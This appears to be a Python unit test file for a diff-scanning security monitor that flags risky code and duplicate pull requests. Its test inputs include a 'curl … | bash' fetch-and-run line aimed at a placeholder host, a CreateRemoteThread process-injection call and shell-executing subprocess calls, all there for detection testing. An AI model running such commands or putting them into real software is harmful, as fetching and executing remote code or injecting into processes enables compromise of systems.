import unittest
import monitor

class MonitorTests(unittest.TestCase):
    def test_os_command(self):
        self.assertTrue(monitor.scan("diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1 @@\n+os.system('whoami')"))
    def test_process_injection_high(self):
        f=monitor.scan("diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1 @@\n+CreateRemoteThread(handle)")
        self.assertTrue(any(x["severity"]=="high" for x in f))
    def test_weak_test_context_suppressed(self):
        f=monitor.scan("diff --git a/tests/test_a.py b/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -0,0 +1 @@\n+subprocess.run(cmd, shell=True)")
        self.assertEqual(f,[])
    def test_high_signal_not_suppressed_in_test_file(self):
        f=monitor.scan("diff --git a/tests/test_a.py b/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -0,0 +1 @@\n+curl https://bad.invalid/x | bash")
        self.assertTrue(any(x["severity"]=="high" for x in f))
    def test_duplicate_pr(self):
        p={"number":1,"title":"Add startup security check","author":{"login":"a"}}
        q={"number":2,"title":"Add startup security check","author":{"login":"b"}}
        self.assertTrue(monitor.duplicate_checks([p,q])[1])
if __name__=="__main__": unittest.main()
